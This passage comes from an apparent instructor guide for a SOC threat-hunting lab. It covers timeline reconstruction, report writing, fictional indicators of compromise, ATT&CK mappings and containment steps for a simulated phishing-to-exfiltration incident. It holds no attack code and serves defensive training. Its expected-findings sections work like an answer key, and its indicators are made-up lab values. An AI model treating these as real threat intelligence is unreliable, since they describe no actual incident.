Determine how each event relates to the overall attack chain.

## Expected Findings

Participants should successfully reconstruct the complete attack sequence, including:

* phishing delivery,
* user targeting,
* account compromise,
* OAuth persistence,
* mailbox forwarding persistence,
* privilege escalation,
* workload execution,
* command-and-control communication,
* data staging,
* and possible data exfiltration.

## Instructor Notes

Explain that advanced investigations require analysts to correlate multiple telemetry sources together.

Highlight that:

* no single alert revealed the complete attack,
* attacker activity evolved over multiple stages,
* and timeline reconstruction provides critical incident context.

Emphasize that timeline reconstruction is essential for:

* incident scoping,
* response coordination,
* containment planning,
* and executive reporting.

## Final Analyst Takeaway

Explain that effective threat hunting requires analysts to:

* correlate telemetry across multiple systems,
* validate findings using evidence,
* avoid relying on a single indicator,
* and reconstruct attacker behavior through investigation-driven analysis.

Reinforce that modern SOC investigations are heavily dependent on:

* telemetry correlation,
* behavioral analysis,
* and analyst reasoning.


## Stage 9 — Produce a SOC Investigation Report


## Objective

Produce a structured SOC investigation summary based on the findings collected throughout the investigation.

## Instructor Demonstration Guide

Explain that SOC investigations are not complete until findings are properly documented and communicated.

Highlight that investigation reports must be:

* technically accurate,
* clearly communicated,
* actionable for incident response teams,
* and understandable by both technical and non-technical stakeholders.

Explain that analysts must now consolidate all investigation findings into a coherent attack narrative.

## Investigation Actions

Review findings collected during previous stages from:

* email telemetry,
* authentication activity,
* OAuth activity,
* workload execution,
* DNS telemetry,
* network telemetry,
* and cloud telemetry.

Document the following sections:

* Executive Summary
* Timeline of Events
* Technical Findings
* MITRE ATT&CK Mapping
* Containment Recommendations

## Building the Executive Summary

Explain that the Executive Summary should provide a high-level overview of the incident.

The summary should include:

* how the attack started,
* which user was impacted,
* how the attacker maintained access,
* what malicious activity occurred,
* and whether exfiltration was identified.

Expected summary elements:

* phishing-based initial access,
* account compromise,
* OAuth persistence,
* command-and-control communication,
* and possible data exfiltration.

## Building the Timeline of Events

Explain that analysts should organize findings chronologically.

Recommended timeline events include:

* phishing email delivery,
* suspicious user interaction,
* successful foreign login,
* OAuth consent grant,
* mailbox forwarding rule creation,
* IAM privilege escalation,
* suspicious command execution,
* DNS beaconing activity,
* outbound command-and-control traffic,
* archive creation,
* and cloud storage upload activity.

## Building the Technical Findings Section

Explain that technical findings should clearly describe:

* attacker activity,
* affected systems,
* suspicious infrastructure,
* malicious tooling,
* and impacted accounts.

Important findings should include:

* malicious domain: `c2-example.com`
* suspicious IP address: `203.0.113.10`
* suspicious OAuth application: `Invoice Viewer Pro`
* compromised account: `emily.carter@workspace-lab.com`
* compromised workstation: `WKSTN-044`
* malicious SHA256: `7b2c9a1f4d9e8c0a3d2f1e0b9a8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c`

## MITRE ATT&CK Mapping

Document the following ATT&CK mappings:

* T1566 — Phishing
* T1078 — Valid Accounts
* T1550 — Token Abuse
* T1059 — Command Execution
* T1071 — Command and Control
* T1567 — Exfiltration

## Building Containment Recommendations

Explain that containment recommendations should focus on:

* stopping attacker activity,
* removing persistence,
* limiting further impact,
* and preventing reinfection.

Recommended actions include:

* disable or reset the compromised account,
* revoke OAuth tokens and sessions,
* remove malicious mailbox forwarding rules,
* remove malicious OAuth applications,
* isolate the compromised workstation,
* block malicious domains and IP addresses,
* and investigate possible data exposure.

## Expected Findings

Participants should produce:

* a clear attack narrative,
* a validated attack timeline,
* technical investigation findings,
* ATT&CK mappings,
* and actionable remediation recommendations.

## Instructor Notes

Explain that strong SOC reporting requires analysts to:

* communicate clearly,
* support conclusions with evidence,
* correlate telemetry sources,
* and explain attacker behavior in a structured manner.

Highlight that investigation reporting is critical for:

* incident response coordination,
* executive communication,
* legal and compliance requirements,
* and long-term defensive improvements.


# Instructor Wrap-Up


Explain that this capstone demonstrates how modern threat hunting requires:

* cross-artifact correlation,
* hypothesis-driven investigation,
* behavioral analysis,
* and the ability to pivot between cloud, SaaS, identity, and workload telemetry.

Reinforce that:

* no single alert revealed the full attack chain,
* multiple weak signals were correlated into a complete adversary narrative,
* and successful threat hunting depends on analyst reasoning, context, telemetry correlation, and investigative pivots.


# Final Analyst Takeaway


Explain that effective threat hunting requires analysts to:

* investigate beyond individual alerts,
* correlate evidence across multiple systems,
* validate findings using telemetry,
* reconstruct attacker behavior,
* and communicate findings clearly to stakeholders.

Highlight that modern SOC investigations rely heavily on:

* telemetry correlation,
* behavioral analysis,
* analyst reasoning,
* and structured investigative workflows.


## End Your Lab


1. Click **End Lab**
